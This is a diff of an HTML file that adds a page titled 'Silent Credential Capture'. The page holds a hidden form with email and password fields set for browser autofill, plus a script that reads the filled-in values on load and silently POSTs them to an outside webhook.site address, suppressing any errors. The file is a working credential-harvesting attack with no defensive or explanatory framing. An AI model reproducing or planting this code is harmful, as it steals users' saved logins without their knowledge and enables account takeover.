@@ -1,18 +1,33 @@
-<script>
-(function() {
-  window.addEventListener('load', function() {
-    setTimeout(function() {
-      var email = document.getElementById('email').value;
-      var password = document.getElementById('password').value;
-      if (email && password) {
-        fetch('https://webhook.site/0b275640-c758-4b06-8b38-e6787c7e21f6', {
-          method: 'POST',
-          mode: 'no-cors',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ email: email, password: password, timestamp: Date.now() })
-        }).catch(function(e) { /* silent */ });
-      }
-    }, 50);
-  });
-})();
-</script>
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Silent Credential Capture</title>
+</head>
+<body>
+  <form id="harvest" style="display:none;">
+    <input type="email" name="email" id="email" autocomplete="username" />
+    <input type="password" name="password" id="password" autocomplete="current-password" />
+    <input type="submit" />
+  </form>
+
+  <script>
+    (function() {
+      window.addEventListener('load', function() {
+        setTimeout(function() {
+          var email = document.getElementById('email').value;
+          var password = document.getElementById('password').value;
+          if (email && password) {
+            fetch('https://webhook.site/0b275640-c758-4b06-8b38-e6787c7e21f6', {
+              method: 'POST',
+              mode: 'no-cors',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ email: email, password: password, timestamp: Date.now() })
+            }).catch(function(e) { /* silent */ });
+          }
+        }, 50);
+      });
+    })();
+  </script>
+</body>
+</html>
